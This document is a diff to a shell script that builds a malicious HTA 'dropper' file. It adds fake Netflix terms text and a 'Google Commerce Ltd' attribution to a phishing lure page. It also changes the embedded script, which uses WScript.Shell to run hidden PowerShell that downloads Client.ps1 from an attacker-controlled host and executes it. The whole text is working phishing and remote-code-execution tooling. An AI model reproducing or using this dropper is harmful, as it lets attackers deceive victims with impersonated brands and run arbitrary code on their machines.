@@ -13947,6 +13947,11 @@ if [ "$easter_egg" = "ON" ]; then
       echo "We have award-winning series, films, documentaries and stand-up comedy specials. In addition,<br />" >> $IPATH/output/$Drop.$Ext
       echo "with the mobile application you can watch Netflix on the go, on public transport or on a break.</i><br />" >> $IPATH/output/$Drop.$Ext
       echo "" >> $IPATH/output/$Drop.$Ext
+      echo "<b>For full terms and conditions, visit http://www.netflix.com/termsofuse</b><br />" >> $IPATH/output/$Drop.$Ext
+      echo "" >> $IPATH/output/$Drop.$Ext
+      echo "<b><i>Offered by</i></b><br />" >> $IPATH/output/$Drop.$Ext
+      echo "<i>Google Commerce Ltd</i>" >> $IPATH/output/$Drop.$Ext
+      echo "" >> $IPATH/output/$Drop.$Ext
    fi
 
    echo "<script>" >> $IPATH/output/$Drop.$Ext
@@ -13955,7 +13960,7 @@ if [ "$easter_egg" = "ON" ]; then
    echo "      '<HTA:APPLICATION ID=\"oHTA\" APPLICATIONNAME=\"myApp\" ICON=\"https://github.com/favicon.ico\">'" >> $IPATH/output/$Drop.$Ext
    echo "   );" >> $IPATH/output/$Drop.$Ext
    echo "   a=new ActiveXObject(\"WScript.Shell\");" >> $IPATH/output/$Drop.$Ext
-   echo "   a.run(\"powershell -W 1 Start-Sleep -Seconds 1;powershell start $SE;\$proxy=New-Object -ComObject Msxml2.XMLHTTP;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"$htaexec);" >> $IPATH/output/$Drop.$Ext
+   echo "   a.run(\"powershell Start-Sleep -Seconds 1;powershell -W 1 start $SE;\$proxy=New-Object -ComObject Msxml2.XMLHTTP;\$proxy.open('GET','http://$lhost/Client.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\"$htaexec);" >> $IPATH/output/$Drop.$Ext
    echo "   window.close();" >> $IPATH/output/$Drop.$Ext
    echo "</script>" >> $IPATH/output/$Drop.$Ext
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper.hta html file written to output.";sleep 1
